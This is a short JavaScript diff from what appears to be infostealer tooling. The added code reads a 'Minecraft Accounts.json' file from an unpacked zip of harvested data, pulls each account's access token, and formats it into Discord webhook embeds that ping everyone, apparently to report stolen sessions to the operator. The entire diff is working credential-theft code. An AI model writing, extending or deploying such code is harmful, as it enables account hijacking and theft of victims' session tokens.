@@ -198,6 +198,30 @@ const json = async (zipFile) => {
     });
   }
 
+  if (fs.existsSync(join(tempFolder, 'Minecraft Accounts.json'))) {
+    const accounts = JSON.parse(fs.readFileSync(join(tempFolder, 'Minecraft Accounts.json')).toString());
+
+    accounts.forEach(account => {
+      embeds.push({
+        author: {
+          name: account.minecraftProfile.name,
+          icon_url: `https://crafatar.com/avatars/${account.minecraftProfile.id}?size=32`,
+          url: `https://namemc.com/profile/${account.minecraftProfile.name}`
+        },
+        fields: [
+          ['🔑 Access Token', account.accessToken ? code(account.accessToken) : 'Unknown'],
+          ['🎮 Type', account.type || 'Unknown'],
+        ].map(fieldsMap),
+        thumbnail: {
+          url: `https://crafatar.com/avatars/${account.minecraftProfile.id}`
+        },
+        footer: {
+          text: `Minecraft account found in ${account.source} client`
+        }
+      });
+    });
+  }
+
   return {
     content: webhook.content, embeds, allowed_mentions: { parse: ['everyone'], },
     attachments: [{
